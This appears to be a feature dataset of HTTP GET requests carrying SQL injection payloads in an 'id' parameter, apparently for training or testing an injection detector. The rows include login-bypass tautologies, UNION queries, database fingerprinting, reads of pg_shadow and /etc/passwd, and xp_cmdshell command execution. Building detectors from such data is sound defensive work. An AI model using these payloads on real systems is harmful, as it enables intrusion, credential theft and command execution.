69,1,200,5059,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2003,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1124,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2572,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4474,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,2580,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,5203,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,6019,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,1320,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,4684,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
69,1,200,3867,7,45,5,1,1,GET ?id=select name_ tbname_ coltype from sysibm.syscolumns; HTTP/1.1
56,1,200,1663,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,1519,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,2228,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3685,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,5988,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3405,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
56,1,200,3833,7,34,6,2,1,GET login/?id=select * from master..sysserverse HTTP/1.1
26,1,200,2142,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
26,1,200,6305,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
26,1,200,1436,7,7,5,2,1,GET login/?id=' ' HTTP/1.1
59,1,200,1359,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4681,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5191,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4919,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,4425,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,6044,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,1245,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
59,1,200,5254,7,36,8,1,1,GET ?id=select current_setting('log_connections'); HTTP/1.1
24,1,200,3696,7,7,4,2,0,GET login/?id== HTTP/1.1
24,1,200,4050,7,7,4,2,0,GET login/?id== HTTP/1.1
68,1,200,6718,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3600,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,7848,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2861,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,3207,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,2938,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,5447,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
68,1,200,1500,7,43,8,2,1,GET login/?id=select current_setting('krb_server_keyfile'); HTTP/1.1
55,1,200,3358,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
55,1,200,7357,7,28,7,2,1,GET login/?id=' group by username having 1=1-- HTTP/1.1
29,1,200,2175,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,7131,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,3459,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
29,1,200,2614,7,4,9,1,1,GET ?id=') or '1'='1 HTTP/1.1
27,1,200,4118,7,7,6,1,1,GET ?id=' and a='a HTTP/1.1
28,1,200,4638,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,4333,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,6265,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,2613,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,5436,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
28,1,200,7063,7,4,8,1,1,GET ?id=' or '1'='1 HTTP/1.1
57,1,200,2597,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,3042,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,1615,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,4534,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,4370,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5028,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,2956,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
57,1,200,5382,7,35,5,2,1,GET login/?id=select user from sysibm.sysdummy1; HTTP/1.1
33,1,200,1445,7,12,6,2,1,GET login/?id=' and a='a HTTP/1.1
33,1,200,7027,7,12,6,2,1,GET login/?id=' and a='a HTTP/1.1
33,1,200,1644,7,12,6,2,1,GET login/?id=' and a='a HTTP/1.1
35,1,200,3672,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
35,1,200,6071,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
35,1,200,7131,7,9,9,2,1,GET login/?id=') or '1'='1 HTTP/1.1
69,1,200,2022,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7558,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5296,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,7107,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
69,1,200,5647,7,42,6,4,3,GET login/?id=select * from myfile;copy myfile to /tmp/test; HTTP/1.1
67,1,200,5520,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,7285,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,3321,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4256,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,2812,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4186,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
67,1,200,4716,7,44,5,2,1,GET login/?id=select current server from sysibm.sysdummy1; HTTP/1.1
18,1,200,5479,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,1525,7,2,4,1,1,GET ?id=' HTTP/1.1
18,1,200,2188,7,2,4,1,1,GET ?id=' HTTP/1.1
35,1,200,7240,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
35,1,200,4011,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
35,1,200,4004,7,9,10,1,1,GET ?id=admin' or '1'='1'# HTTP/1.1
39,1,200,6649,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,3765,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,5825,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7912,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,2307,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,7631,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
39,1,200,6579,7,20,4,1,1,GET ?id=select * from sysusers HTTP/1.1
43,1,200,2787,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,1466,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,3029,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,7733,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
43,1,200,6140,7,24,4,2,0,GET login/?id=select session_user; HTTP/1.1
40,1,200,4137,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
40,1,200,7042,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
40,1,200,4412,7,14,9,2,1,GET login/?id=admin') or '1'='1 HTTP/1.1
37,1,200,5994,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
37,1,200,7719,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
37,1,200,5121,7,9,11,2,1,GET login/?id=') or '1'='1'# HTTP/1.1
37,1,200,4000,7,11,9,1,1,GET ?id=admin'or 1=1 or ''=' HTTP/1.1
32,1,200,7062,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
32,1,200,6463,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
32,1,200,6630,7,11,5,2,1,GET login/?id=' or a=a¡V HTTP/1.1
33,1,200,3739,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,1961,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5747,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,1211,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,2072,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,4278,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,5034,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
33,1,200,6188,7,15,5,1,0,GET ?id=select @@version HTTP/1.1
64,1,200,5739,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,7541,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,2934,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,6595,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
64,1,200,1857,7,38,7,3,2,GET login/?id=exec master..xp_cmdshell 'ipconfig /all'	 HTTP/1.1
58,1,200,5530,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7673,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,2659,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,1458,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6948,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,6396,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,7372,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,3966,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
58,1,200,4794,7,36,5,1,1,GET ?id=select system_user from sysibm.sysdummy1; HTTP/1.1
87,1,200,6089,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,3399,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
87,1,200,4934,7,63,5,2,1,GET login/?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
31,1,200,5418,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
31,1,200,5392,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
31,1,200,5369,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
31,1,200,5966,7,12,5,2,1,GET login/?id=admin' # HTTP/1.1
32,1,200,2618,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,2730,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
32,1,200,7487,7,11,6,2,1,GET login/?id= like '%' HTTP/1.1
64,1,200,6750,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,6847,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,7919,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,1254,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,3038,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,2734,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,4113,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
64,1,200,7421,7,41,5,2,1,GET login/?id=select system_user from sysibm.sysdummy1; HTTP/1.1
34,1,200,2784,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,1533,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,7721,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
34,1,200,2348,7,9,7,2,1,GET login/?id=' or 1=1 -- HTTP/1.1
81,1,200,1243,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6880,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,2010,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1071,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,1960,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,4876,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
81,1,200,6064,7,58,5,1,1,GET ?id=select versionnumber_ version_timestamp from sysibm.sysversions; HTTP/1.1
35,1,200,4496,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
35,1,200,1027,7,15,6,1,0,GET ?id=select version();	 HTTP/1.1
58,1,200,5867,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4977,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,1801,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,1727,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,1037,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,6967,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,2262,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
58,1,200,4642,7,34,7,2,2,GET login/?id=exec master..xp_cmdshell 'net view' HTTP/1.1
21,1,200,5299,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,5109,7,2,6,1,1,GET ?id=' -- HTTP/1.1
21,1,200,1750,7,2,6,1,1,GET ?id=' -- HTTP/1.1
49,1,200,4254,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4243,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,3297,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,6155,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4397,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,1912,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,2287,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7584,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,4814,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,2358,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,7740,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
49,1,200,2967,7,30,5,2,0,GET login/?id=select @@microsoftversione HTTP/1.1
94,1,200,5569,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
94,1,200,4726,17,55,7,2,1,GET login/?id=' UNION select table_schema_table_name FROM information_Schema.tables;# HTTP/1.1
43,1,200,7381,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,2759,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,5367,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,3597,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
43,1,200,7300,7,24,4,2,0,GET login/?id=select current_user; HTTP/1.1
27,1,200,3092,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
27,1,200,1302,7,4,6,2,1,GET ?id=' or 1=1/* HTTP/1.1
30,1,200,7476,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,7664,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
30,1,200,2646,7,9,5,2,0,GET login/?id=or 1=1# HTTP/1.1
33,1,200,3769,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,2828,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,3694,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,4746,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,7797,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
33,1,200,2771,7,9,5,2,1,GET login/?id=' or 0=0 ¡V HTTP/1.1
31,1,200,7736,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
31,1,200,5502,7,9,4,2,0,GET login/?id= or 1=1¡V HTTP/1.1
18,1,200,6415,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,6637,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,2007,7,2,4,1,0,GET ?id== HTTP/1.1
18,1,200,2996,7,2,4,1,0,GET ?id== HTTP/1.1
63,1,200,2396,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2981,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,4375,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2851,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,5017,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,1682,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,2944,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,7557,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,3524,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
63,1,200,1374,7,39,8,2,1,GET login/?id=select current_setting('log_statement'); HTTP/1.1
19,1,200,6284,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,3752,7,2,5,1,1,GET ?id='# HTTP/1.1
19,1,200,2063,7,2,5,1,1,GET ?id='# HTTP/1.1
55,1,200,1269,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,3919,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
55,1,200,1107,7,32,8,1,1,GET ?id=select current_setting('config_file'); HTTP/1.1
27,1,200,1193,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,3807,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,4158,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
27,1,200,5961,7,4,7,1,1,GET ?id=' or 1=1;# HTTP/1.1
30,1,200,5207,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,2649,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,3766,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,7104,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
30,1,200,7198,7,9,4,2,0,GET login/?id= or 1=1 HTTP/1.1
37,1,200,2216,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
37,1,200,4142,7,9,11,2,1,GET login/?id=' or '1'='1'-- HTTP/1.1
43,1,200,2873,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,2760,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,1306,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,2571,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,3838,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,7718,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,4201,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,6604,7,24,5,2,0,GET login/?id=select @@servernamee HTTP/1.1
43,1,200,4361,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,2703,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,3826,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,5592,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,4982,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
43,1,200,7170,7,25,5,1,0,GET ?id=select @@microsoftversione HTTP/1.1
63,1,200,4933,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,3739,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,5866,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,7721,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2700,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,6086,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
63,1,200,2723,7,40,8,1,1,GET ?id=select current_setting('password_encryption'); HTTP/1.1
37,1,200,2211,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3950,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,5485,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,1396,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
37,1,200,3225,7,19,5,1,0,GET ?id=select @@servernamee HTTP/1.1
62,1,200,5293,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2900,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,4326,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,2558,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,1916,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
62,1,200,3873,17,31,5,2,1,GET login/?id=SELECT schemaname FROM syscat.schemata; HTTP/1.1
33,1,200,5988,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,7206,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,3819,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
33,1,200,2532,7,9,7,2,1,GET login/?id=' or 1=1-- HTTP/1.1
38,1,200,2856,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
38,1,200,3079,7,14,6,3,1,GET login/?id=admin' or 1=1/* HTTP/1.1
32,1,200,3550,7,9,7,2,1,GET login/?id=' or '' ' HTTP/1.1
27,1,200,6111,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
27,1,200,1582,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
27,1,200,2692,7,4,5,1,1,GET ?id=' or 1=1 ¡V HTTP/1.1
47,1,200,6904,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,2431,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,5694,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
47,1,200,5644,7,25,5,2,1,GET login/?id=select * from pg_shadow; HTTP/1.1
62,1,200,4520,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4612,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6509,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2674,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,7073,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6916,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4628,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,2040,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4229,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3172,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,3365,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,6548,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,1705,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
62,1,200,4460,7,38,8,2,1,GET login/?id=select current_setting('virtual_host'); HTTP/1.1
38,1,200,6529,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
38,1,200,6695,7,16,6,1,1,GET ?id=' or username like '% HTTP/1.1
55,1,200,1360,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
55,1,200,6230,7,30,6,4,3,GET login/?id=copy myfile from '/etc/passwd';  HTTP/1.1
39,1,200,4763,7,9,13,2,1,GET login/?id=') or ('1'='1'-- HTTP/1.1
39,1,200,1666,7,9,13,2,1,GET login/?id=') or ('1'='1'-- HTTP/1.1
49,1,200,3283,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
49,1,200,7230,7,23,7,1,1,GET ?id=' group by password having 1=1-- HTTP/1.1
20,1,200,4386,7,2,5,1,1,GET ?id=' ' HTTP/1.1
64,1,200,7900,7,40,8,2,1,GET login/?id=select current_setting('data_directory'); HTTP/1.1
